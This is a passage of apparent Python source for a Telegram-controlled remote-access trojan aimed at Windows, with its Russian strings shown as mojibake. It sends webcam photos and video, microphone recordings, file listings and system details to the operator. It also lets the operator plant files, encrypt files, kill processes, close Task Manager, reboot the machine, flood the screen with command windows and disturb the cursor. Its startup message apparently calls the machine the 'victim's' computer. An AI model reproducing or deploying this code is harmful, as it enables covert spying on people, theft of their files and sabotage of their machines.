                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ.")
            
            waiting_for_video_duration = False
            bot.send_message(message.chat.id, "–ì–æ—Ç–æ–≤–æ!", reply_markup=create_main_menu())
        except ValueError:
            bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ.")
            waiting_for_video_duration = False
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
            waiting_for_video_duration = False
        return
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø—É—Ç–∏ –∫ —Ñ–∞–π–ª—É
    if waiting_for_file_path:
        try:
            path = message.text.strip()
            if not os.path.exists(path):
                bot.send_message(message.chat.id, "–§–∞–π–ª –∏–ª–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω—ã. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")
                return
            
            if os.path.isfile(path):
                os.startfile(path)
                bot.send_message(message.chat.id, "–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫—Ä—ã—Ç!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "–£–∫–∞–∑–∞–Ω–Ω—ã–π –ø—É—Ç—å —è–≤–ª—è–µ—Ç—Å—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–µ–π, –∞ –Ω–µ —Ñ–∞–π–ª–æ–º.", reply_markup=create_main_menu())
            
            waiting_for_file_path = False
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
            waiting_for_file_path = False
        return
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥ –∏–∑ –º–µ–Ω—é
    if message.text == 'üì∑ –°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã':
        try:
            cap = cv2.VideoCapture(WEB_CAMERA_INDEX)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                cv2.imwrite(SCREENSHOT_PATH, frame)
                with open(SCREENSHOT_PATH, 'rb') as photo:
                    bot.send_photo(message.chat.id, photo)
                os.remove(SCREENSHOT_PATH)
            else:
                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã.")
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
    
    elif message.text == 'üé• –ó–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã':
        waiting_for_video_duration = True
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö (–º–∞–∫—Å–∏–º—É–º 30):")
    
    elif message.text == 'üé§ –ó–∞–ø–∏—Å–∞—Ç—å –∑–≤—É–∫ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞':
        waiting_for_audio_duration = True
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –∑–≤—É–∫–∞ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö (–º–∞–∫—Å–∏–º—É–º 60):")
    
    elif message.text == '‚ùå –ó–∞–∫—Ä—ã—Ç—å —Ç–µ–∫—É—â–µ–µ –æ–∫–Ω–æ':
        try:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd:
                win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                bot.send_message(message.chat.id, "–¢–µ–∫—É—â–µ–µ –æ–∫–Ω–æ –∑–∞–∫—Ä—ã—Ç–æ!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å —Ç–µ–∫—É—â–µ–µ –æ–∫–Ω–æ.", reply_markup=create_main_menu())
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}", reply_markup=create_main_menu())
    
    elif message.text == '‚ùå‚ùå –ó–∞–∫—Ä—ã—Ç—å –≤—Å–µ –æ–∫–Ω–∞':
        if close_all_windows():
            bot.send_message(message.chat.id, "–í—Å–µ –æ–∫–Ω–∞ –∑–∞–∫—Ä—ã—Ç—ã!", reply_markup=create_main_menu())
        else:
            bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–∫—Ä—ã—Ç—å –≤—Å–µ –æ–∫–Ω–∞.", reply_markup=create_main_menu())
    
    elif message.text == 'üñºÔ∏è –°–º–µ–Ω–∏—Ç—å –æ–±–æ–∏':
        waiting_for_wallpaper_image = True
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –æ–±–æ–µ–≤:")
    
    elif message.text == 'üìÇ –ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Ç–µ–∫—É—â—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é':
        try:
            files = []
            for item in os.listdir(current_directory):
                item_path = os.path.join(current_directory, item)
                if os.path.isdir(item_path):
                    files.append(f"{item} *–ø–∞–ø–∫–∞*")
                else:
                    files.append(f"{item}")
            
            response = f"–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ {current_directory}:\n\n" + "\n".join(files)
            bot.send_message(message.chat.id, response, reply_markup=create_main_menu())
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}", reply_markup=create_main_menu())
    
    elif message.text == 'üìÇ –ü–µ—Ä–µ–π—Ç–∏ –≤ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é':
        bot.send_message(message.chat.id, f"–¢–µ–∫—É—â–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è: {current_directory}\n–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ –Ω–æ–≤–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏:")
        waiting_for_file_path = True
    
    elif message.text == 'üìÑ –û—Ç–∫—Ä—ã—Ç—å —Ñ–∞–π–ª':
        bot.send_message(message.chat.id, "–ü—Ä–∏–º–µ—Ä: C:/Users/User/–¥–æ–∫—É–º–µ–Ω—Ç.txt\n–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É:")
        waiting_for_file_path = True
    
    elif message.text == 'üì§ –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª':
        waiting_for_upload_path = True
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ –ø–∞–ø–∫–µ, –≤ –∫–æ—Ç–æ—Ä—É—é –Ω—É–∂–Ω–æ –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª:")
    
    elif message.text == 'üîí –ó–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª':
        waiting_for_encrypt_path = True
        bot.send_message(message.chat.id, "–ü—Ä–∏–º–µ—Ä: C:/Users/User/—Å–µ–∫—Ä–µ—Ç.txt\n–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è:")
    elif message.text == 'üîì –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —Ñ–∞–π–ª':
        waiting_for_decrypt_path = True
        bot.send_message(message.chat.id, "–ü—Ä–∏–º–µ—Ä: C:/Users/User/—Å–µ–∫—Ä–µ—Ç.txt.encrypted\n–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å –∫ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–º—É —Ñ–∞–π–ª—É:")
    
    elif message.text == '‚èª –í—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä':
        shutdown_confirmation_code = random.randint(10, 110)
        waiting_for_shutdown_confirmation = True
        bot.send_message(message.chat.id, f"–î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤—ã–∫–ª—é—á–µ–Ω–∏—è –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥: {shutdown_confirmation_code}\n–ï—Å–ª–∏ –ø–µ—Ä–µ–¥—É–º–∞–ª–∏ - –ø—Ä–æ—Å—Ç–æ –∏–≥–Ω–æ—Ä–∏—Ä—É–π—Ç–µ —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ.")
    
    elif message.text == 'üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä':
        os.system("shutdown /r /t 1")
        bot.send_message(message.chat.id, "–ö–æ–º–ø—å—é—Ç–µ—Ä –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...")
    
    elif message.text == '‚ÑπÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö':
        info = get_system_info()
        bot.send_message(message.chat.id, info, reply_markup=create_main_menu())
    
    elif message.text == 'üìä –ó–∞–ø—É—â–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã':
        processes = get_processes()
        bot.send_message(message.chat.id, processes, reply_markup=create_main_menu())
    
    elif message.text == 'üíÄ –ü—Ä–µ–∫—Ä–∞—Ç–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å':
        waiting_for_process_pid = True
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ PID –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, 4080):")
    
    elif message.text == '‚ùå –ó–∞–∫—Ä—ã—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á':
        if close_task_manager():
            bot.send_message(message.chat.id, "–î–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á –∑–∞–∫—Ä—ã—Ç!", reply_markup=create_main_menu())
        else:
            bot.send_message(message.chat.id, "–î–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á –Ω–µ –±—ã–ª –Ω–∞–π–¥–µ–Ω –∏–ª–∏ —É–∂–µ –∑–∞–∫—Ä—ã—Ç.", reply_markup=create_main_menu())
    
    elif message.text == 'üåÄ –°–≤–µ—Å—Ç–∏ –∫—É—Ä—Å–æ—Ä —Å —É–º–∞':
        waiting_for_cursor_madness_duration = True
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤ —Å–µ–∫—É–Ω–¥–∞—Ö (–º–∞–∫—Å–∏–º—É–º 60):")
    
    elif message.text == 'üí£ CMD –±–æ–º–±–∞':
        waiting_for_cmd_bomb_count = True
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ CMD –æ–∫–æ–Ω (–º–∞–∫—Å–∏–º—É–º 450):")
    
    elif message.text == 'üìÄ –û—Ç–∫—Ä—ã—Ç—å –¥–∏—Å–∫–æ–≤–æ–¥':
        if open_cd_drive():
            bot.send_message(message.chat.id, "–î–∏—Å–∫–æ–≤–æ–¥ –æ—Ç–∫—Ä—ã—Ç!", reply_markup=create_main_menu())
        else:
            bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å –¥–∏—Å–∫–æ–≤–æ–¥.", reply_markup=create_main_menu())
    
    else:
        bot.send_message(message.chat.id, "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –º–µ–Ω—é.", reply_markup=create_main_menu())

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤ (–¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤)
@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "‚õî –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω!")
        return
    
    global waiting_for_wallpaper_image, waiting_for_upload_path, current_directory
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        if waiting_for_wallpaper_image:
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è –æ–±–æ–µ–≤
            image_path = 'wallpaper.jpg'
            with open(image_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            if change_wallpaper(image_path):
                bot.send_message(message.chat.id, "–û–±–æ–∏ —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω—ã!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–º–µ–Ω–∏—Ç—å –æ–±–æ–∏.", reply_markup=create_main_menu())
            
            waiting_for_wallpaper_image = False
            if os.path.exists(image_path):
                os.remove(image_path)
        
        elif waiting_for_upload_path:
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∑–∞–≥—Ä—É–∂–∞–µ–º—ã–π —Ñ–∞–π–ª
            file_name = message.document.file_name
            file_path = os.path.join(current_directory, file_name)
            
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            bot.send_message(message.chat.id, f"–§–∞–π–ª {file_name} —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω –≤ {current_directory}!", reply_markup=create_main_menu())
            waiting_for_upload_path = False
    except Exception as e:
        bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
        waiting_for_wallpaper_image = False
        waiting_for_upload_path = False

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø–æ–ª—É—á–µ–Ω–∏—è —Ñ–æ—Ç–æ (–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–± –¥–ª—è –æ–±–æ–µ–≤)
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "‚õî –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω!")
        return
    
    global waiting_for_wallpaper_image
    
    if waiting_for_wallpaper_image:
        try:
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            image_path = 'wallpaper.jpg'
            with open(image_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            if change_wallpaper(image_path):
                bot.send_message(message.chat.id, "–û–±–æ–∏ —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω—ã!", reply_markup=create_main_menu())
            else:
                bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–º–µ–Ω–∏—Ç—å –æ–±–æ–∏.", reply_markup=create_main_menu())
            
            waiting_for_wallpaper_image = False
            if os.path.exists(image_path):
                os.remove(image_path)
        
        except Exception as e:
            bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: {str(e)}")
            waiting_for_wallpaper_image = False

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –≤–∫–ª—é—á–µ–Ω–∏–∏ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
def send_startup_notification():
    try:
        bot.send_message(AUTHORIZED_USER_ID, "–ö–æ–º–ø—å—é—Ç–µ—Ä –∂–µ—Ä—Ç–≤—ã –≤–∫–ª—é—á–µ–Ω, –Ω–∞–∂–º–∏—Ç–µ /start –¥–ª—è –Ω–∞—á–∞–ª–∞ —Ä–∞–±–æ—Ç—ã")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –≤–∫–ª—é—á–µ–Ω–∏–∏: {e}")

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –≤—ã–∫–ª—é—á–µ–Ω–∏–∏ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞
def send_shutdown_notification():
    try:
        bot.send_message(AUTHORIZED_USER_ID, "–≠—Ö, –∫–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –≤—ã–∫–ª—é—á–µ–Ω–∏–∏: {e}")

# –ü—Ä–æ–≤–µ—Ä–∫–∞, –∑–∞–ø—É—â–µ–Ω –ª–∏ —Å–∫—Ä–∏–ø—Ç –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ —Å–∏—Å—Ç–µ–º—ã
if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
    # –ï—Å–ª–∏ —ç—Ç–æ —Å–æ–±—Ä–∞–Ω–Ω—ã–π exe —Ñ–∞–π–ª (–Ω–∞–ø—Ä–∏–º–µ—Ä, —á–µ—Ä–µ–∑ PyInstaller)
    send_startup_notification()

# –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –±–æ—Ç–∞
if __name__ == '__main__':
    try:
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –≤–∫–ª—é—á–µ–Ω–∏–∏
        send_startup_notification()
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
        bot.polling(none_stop=True)
    except KeyboardInterrupt:
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –≤—ã–∫–ª—é—á–µ–Ω–∏–∏
        send_shutdown_notification()
        sys.exit(0)
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º —Ü–∏–∫–ª–µ: {e}")
        time.sleep(10)
        # –ü—ã—Ç–∞–µ–º—Å—è –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å –±–æ—Ç–∞ –ø—Ä–∏ –æ—à–∏–±–∫–µ
        os.execv(sys.executable, ['python'] + sys.argv)